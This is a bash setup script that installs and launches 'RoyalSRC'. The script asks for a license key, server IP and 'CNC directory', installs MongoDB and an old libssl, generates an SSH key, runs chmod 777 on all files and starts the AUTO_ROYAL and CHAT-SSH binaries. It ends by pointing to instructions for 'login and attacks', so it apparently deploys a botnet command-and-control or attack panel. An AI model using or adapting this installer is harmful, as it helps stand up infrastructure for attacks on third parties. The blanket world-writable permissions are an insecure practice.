#!/bin/bash

set -e

# Variables
CONFIG_JSON="build/config.json"
SRC="./RoyalSRC"
SSH_KEY_PATH="build/ssh-key"
MONGODB_KEY_URL="https://www.mongodb.org/static/pgp/server-4.4.asc"
MONGODB_REPO="deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/4.4 multiverse"
LIBSSL_DEB_URL="http://archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2_amd64.deb"

# Helper function for displaying messages
function msg {
    echo -e "\n\033[1;34m$1\033[0m"
}

function err {
    echo -e "\n\033[1;31mERROR: $1\033[0m" >&2
    exit 1
}

# Step 1: Configuration File Updates
msg "Step 1: Updating configuration files"
if [ ! -f "$CONFIG_JSON" ]; then
    err "$CONFIG_JSON not found. Please ensure the file exists."
fi

if [ ! -f "$SRC" ]; then
    err "$SRC not found. Please ensure the file exists."
fi

# Update config.json with license key and server IPs
read -p "Enter your license key: " LICENSE_KEY
jq --arg key "$LICENSE_KEY" '.license_key = $key' $CONFIG_JSON > tmp.json && mv tmp.json $CONFIG_JSON || err "Failed to update license key."

read -p "Enter your server IP address: " SERVER_IP
jq --arg ip "$SERVER_IP" '.server_ip = $ip' $CONFIG_JSON > tmp.json && mv tmp.json $CONFIG_JSON || err "Failed to update server IP."

# Update RoyalSRC.sh with CNC directory
read -p "Enter your CNC directory (default: /root/RoyalSRC): " CNC_DIR
CNC_DIR=${CNC_DIR:-/root/RoyalSRC}
sed -i "s|/root/RoyalSRC|$CNC_DIR|" $SRC || err "Failed to update CNC directory in RoyalSRC.sh."

msg "Configuration files updated successfully."

# Step 2: Installing Dependencies
msg "Step 2: Installing dependencies"

# Update and upgrade system packages
sudo apt-get update -y || err "Failed to update package list."
sudo apt-get upgrade -y || err "Failed to upgrade packages."

# Install gnupg
sudo apt-get install -y gnupg || err "Failed to install gnupg."

# Add MongoDB key and repository
curl -fsSL $MONGODB_KEY_URL | sudo apt-key add - || err "Failed to add MongoDB key."
echo "$MONGODB_REPO" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list || err "Failed to add MongoDB repository."

# Install libssl1.1
wget -O libssl1.1.deb $LIBSSL_DEB_URL || err "Failed to download libssl1.1 package."
sudo dpkg -i libssl1.1.deb || err "Failed to install libssl1.1 package."

# Install MongoDB
sudo apt-get update || err "Failed to update package list after adding MongoDB repository."
sudo apt-get install -y mongodb-org || err "Failed to install MongoDB."

# Start and check MongoDB service
sudo systemctl start mongod.service || err "Failed to start MongoDB service."
sudo systemctl status mongod || err "MongoDB service is not running."

# Generate and move SSH key
ssh-keygen -t rsa -b 2048 -f ssh-key -N "" || err "Failed to generate SSH key."
sudo mv ssh-key $SSH_KEY_PATH || err "Failed to move SSH key to $SSH_KEY_PATH."

msg "Dependencies installed and configured successfully."

# Step 3: Permissions and Execution
msg "Step 3: Setting up permissions and executing scripts"

# Navigate to RoyalSRC directory
read -p "Enter the path to your RoyalSRC directory: " ROYAL_SRC_DIR
cd $ROYAL_SRC_DIR || err "Failed to change directory to $ROYAL_SRC_DIR."

# Set permissions and run AUTO_ROYAL
chmod 777 * || err "Failed to set permissions."
./AUTO_ROYAL || err "Failed to execute AUTO_ROYAL."

msg "Royal SRC setup completed successfully."

# Instructions for reattaching to screen or pm2
msg "To reattach to the Royal SRC screen session, use:"
msg "screen -r SRC_session"
msg "To manage Royal SRC with pm2, use the following commands:"
msg "To start: pm2 start \"./RoyalSRC\" --name RoyalSRC"
msg "To view logs: pm2 log RoyalSRC"
msg "To stop: pm2 stop RoyalSRC"

# Instructions for additional setups
msg "For SHH-CHAT setup, navigate to /RoyalSRC/ and run:"
msg "pm2 start \"./CHAT-SSH\" --name CHAT-SSH"
msg "To stop CHAT-SSH: pm2 stop CHAT-SSH"
msg "To view logs: pm2 log CHAT-SSH"

msg "Setup is complete. Follow the remaining instructions for login and attacks."
